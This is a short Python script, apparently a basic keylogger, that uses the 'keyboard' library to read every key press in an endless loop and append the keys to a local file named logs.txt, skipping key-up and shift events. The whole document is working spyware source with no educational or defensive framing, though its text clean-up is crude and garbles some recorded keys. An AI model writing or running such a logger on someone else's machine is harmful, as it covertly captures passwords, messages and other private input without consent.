import keyboard

def keylog():
    log = str(keyboard.read_event())
    logs = open('logs.txt', 'a')
    j = log.replace('KeyboardEvent', '')
    j = j.replace(j[0], '')
    j = j.replace(j[-1], '')
    j = j.replace('down', '')
    if "up" in j:
        pass
    elif "shift" in j:
        pass
    else:
        logs.write(f"{j}\n")
        
if __name__=='__main__':
    while True:
        keylog()
